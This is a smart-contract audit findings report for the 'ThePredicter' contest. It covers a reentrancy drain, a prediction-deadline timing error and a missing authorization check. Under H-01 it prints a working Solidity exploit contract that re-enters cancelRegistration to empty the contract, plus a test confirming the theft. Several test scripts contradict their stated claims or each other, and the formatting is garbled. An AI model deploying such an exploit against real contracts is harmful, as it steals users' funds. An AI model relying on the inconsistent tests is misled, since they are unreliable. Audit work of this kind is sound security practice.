# First Flight #20: The Predicter - Findings Report

# Table of contents
- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
    - ### [H-01. Reentrancy Vulnerability in `cancelRegistration` Function Allowing Full Contract Balance Drain](#H-01)
    - ### [H-02.  Incorrect timing for when predictions are closed for 9 games](#H-02)
  
- ## Medium Risk Findings
    - ### [M-01. No check to ensure that a player is authorized to make a prediction.](#M-01)
   


# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #20

### Dates: Jul 18th, 2024 - Jul 25th, 2024

[See more contest details here](https://codehawks.cyfrin.io/c/2024-07-the-predicter)

# <a id='results-summary'></a>Results Summary

### Number of findings:
- High: 2
- Medium: 1


# High Risk Findings

## <a id='H-01'></a>H-01. Reentrancy Vulnerability in `cancelRegistration` Function Allowing Full Contract Balance Drain            



## Summary 

## The function `cancelRegistration` in ThePredicter contract has a reentrancy vulnerability bug because it updates the user's status after sending ether. An attacker can exploit this by re-entering the function call and draining the contract before their status is updated.

## Vulnerability Details

You find the bug on 

## <https://github.com/Cyfrin/2024-07-the-predicter/blob/839bfa56fe0066e7f5610197a6b670c26a4c0879/src/ThePredicter.sol#L64>

The following exploit contract will take advantage of the reentrancy vulnerability in the `cancelRegistration` function to drain funds from `ThePredicter`:

`// SPDX-License-Identifier: MIT`\
`pragma solidity ^0.8.0;`

`import "./ThePredicter.sol";`

`contract Exploit {````ThePredicter public thePredicter;````address public owner;`

```Solidity
constructor(address _thePredicter) {
    thePredicter = ThePredicter(_thePredicter);
    owner = msg.sender;
}

// Fallback function to enable reentrancy attack
receive() external payable {
    if (address(thePredicter).balance >= thePredicter.entranceFee()) {
        thePredicter.cancelRegistration();
    }
}

function attack() external payable {
    require(msg.value == thePredicter.entranceFee(), "Send exact entrance fee");

    // Register with the vulnerable contract
    thePredicter.register{value: msg.value}();

    // Trigger the exploit
    thePredicter.cancelRegistration();
}

function withdraw() external {
    require(msg.sender == owner, "Not the owner");
    payable(owner).transfer(address(this).balance);
}
```

`}`

## Here is the test script to demonstrate the attack using Foundry

// SPDX-License-Identifier: MIT\
pragma solidity ^0.8.0;

import "forge-std/Test.sol";\
import "../src/ThePredicter.sol";\
import "../src/Exploit.sol";

contract ThePredicterTest is Test {\
ThePredicter public thePredicter;\
Exploit public exploit;\
address public owner = address(1);\
uint256 public entranceFee = 0.04 ether;

```Solidity
function setUp() public {
    vm.deal(owner, 1 ether);
    vm.startPrank(owner);

    thePredicter = new ThePredicter(entranceFee);
    exploit = new Exploit(address(thePredicter));

    vm.stopPrank();
}

function testExploit() public {
    // Fund the ThePredicter contract
    vm.deal(address(thePredicter), 1 ether);

    // Start the attack
    vm.startPrank(owner);
    exploit.attack{value: entranceFee}();

    // Ensure the exploit contract drained the funds
    assertGt(address(exploit).balance, 1 ether);
    assertEq(address(thePredicter).balance, 0);
    vm.stopPrank();
}
```

}

Impact: Users who have registered and paid the entrance fee can have their funds stolen by an attacker. This undermines trust in the contract and its security.

## Tools Used

Manual Review

Foundry

## Recommendations

To fix the vulnerability, update the state before making any external calls: following CEI

`function cancelRegistration() public {`\
`if (playersStatus[msg.sender] == Status.Pending) {`\
`playersStatus[msg.sender] = Status.Canceled;`\
`(bool success, ) = msg.sender.call{value: entranceFee}("");`\
`require(success, "Failed to withdraw");`\
`return;`\
`}`\
`revert ThePredicter__NotEligibleForWithdraw();`\
`}`

## <a id='H-02'></a>H-02.  Incorrect timing for when predictions are closed for 9 games             

## Summary 

The `makePrediction` function in the `ThePredicter` contract contains a bug in calculating the prediction deadline. The function incorrectly uses `68400` seconds (19 hours) to determine the cutoff time for predictions. This miscalculation results in inaccurate timing for the remaining 8 matches, allowing users to submit predictions after the prediction period has ended and potentially even during the match itself. This undermines the integrity of the prediction system and can lead to unfair advantages and distorted outcomes.

## Vulnerability Details

<https://github.com/Cyfrin/2024-07-the-predicter/blob/839bfa56fe0066e7f5610197a6b670c26a4c0879/src/ThePredicter.sol#L93>

The function uses `68400` seconds to calculate the prediction deadline, which results in incorrect timing. The problem arises because `68400` seconds does not accurately represent the time from one match to the next, nor does it correctly set the prediction deadline to 19:00:00 UTC on match days. This miscalculation means that predictions might be closed at unintended times, causing disruptions in the prediction process.

Below is the test script using Foundry to show that a player can place a prediction after the prediction deadline

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/ThePredicter.sol";
import "../src/ScoreBoard.sol";

contract ThePredicterTest is Test {
    ThePredicter public thePredicter;
    ScoreBoard public scoreBoard;
    address public owner = address(1);
    address public player = address(2);
    uint256 public predictionFee = 0.01 ether;
    uint256 public entranceFee = 0.04 ether;
    uint256 public START_TIME = 1723740000; // Example START_TIME: August 15, 2024, 20:00:00 UTC

    function setUp() public {
        vm.deal(owner, 1 ether);
        vm.deal(player, 1 ether);
        vm.startPrank(owner);

        scoreBoard = new ScoreBoard();
        thePredicter = new ThePredicter(entranceFee, predictionFee, START_TIME, address(scoreBoard));

        vm.stopPrank();
    }

    function testPredictionAfterDeadline() public {
        vm.startPrank(player);
        
        // Advance time to after the prediction deadline for matchNumber 0
        vm.warp(START_TIME + 68400); // 68400 seconds after START_TIME (19 hours)

        // Ensure player can still make a prediction after the deadline
        vm.expectRevert(ThePredicter__PredictionsAreClosed.selector);
        thePredicter.makePrediction{value: predictionFee}(0, ScoreBoard.Result.Win);

        vm.stopPrank();
    }
}

```

## Impact

Predictions may be closed at unintended times, disrupting the prediction process.

## Tools Used

manual review 

Foundry

## Recommendations

Use `86400` seconds (24 hours) to move the time forward by a day for each match and subtract `3600` seconds (1 hour) to set the deadline to 19:00:00 UTC.

```Solidity
if (block.timestamp > START_TIME + matchNumber * 86400 - 3600) {
    revert ThePredicter__PredictionsAreClosed();
}

```

# Medium Risk Findings

## <a id='M-02'></a>M-02. No check to ensure that a player is authorized to make a prediction.            

## Summary  The `makePrediction` function doesn't check if a user is approved before allowing them to make a prediction. Implyng more than thirty persons and anyone can make a prediction. 

## Vulnerability Details

<https://github.com/Cyfrin/2024-07-the-predicter/blob/839bfa56fe0066e7f5610197a6b670c26a4c0879/src/ThePredicter.sol#L85>

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/ThePredicter.sol";
import "../src/ScoreBoard.sol";

contract ThePredicterTest is Test {
    ThePredicter public thePredicter;
    ScoreBoard public scoreBoard;
    address public owner = address(1);
    address public player = address(2);
    uint256 public predictionFee = 0.01 ether;
    uint256 public entranceFee = 0.04 ether;
    uint256 public START_TIME = 1723752000; // Example START_TIME: August 15, 2024, 20:00:00 UTC

    function setUp() public {
        vm.deal(owner, 1 ether);
        vm.deal(player, 1 ether);
        vm.startPrank(owner);

        scoreBoard = new ScoreBoard();
        thePredicter = new ThePredicter(address(scoreBoard), entranceFee, predictionFee);

        // Register the player but do not approve them
        thePredicter.register{value: entranceFee}();

        vm.stopPrank();
    }

    function testUnapprovedPlayerCannotPredict() public {
        vm.startPrank(player);

        // Attempt to make a prediction
        vm.expectRevert(ThePredicter__UnauthorizedAccess.selector);
        thePredicter.makePrediction{value: predictionFee}(0, ScoreBoard.Result.Win);

        vm.stopPrank();
    }
}

```

## Impact

Unauthorized users can make predictions, potentially compromising the integrity of the prediction system.

## Tools Used

manual review

## Recommendations

Add a check to verify that the player is authorized to make a prediction before confirming payment and setting the prediction.

```Solidity
function makePrediction(
    uint256 matchNumber,
    ScoreBoard.Result prediction
) public payable {
    if (msg.value != predictionFee) {
        revert ThePredicter__IncorrectPredictionFee();
    }

    if (block.timestamp > START_TIME + matchNumber * 86400 - 3600) {
        revert ThePredicter__PredictionsAreClosed();
    }

    if (playersStatus[msg.sender] != Status.Approved) {
        revert ThePredicter__UnauthorizedAccess();
    }

    scoreBoard.confirmPredictionPayment(msg.sender, matchNumber);
    scoreBoard.setPrediction(msg.sender, matchNumber, prediction);

    emit PredictionMade(msg.sender, matchNumber, prediction);
}

event PredictionMade(address indexed player, uint256 matchNumber, ScoreBoard.Result prediction);

```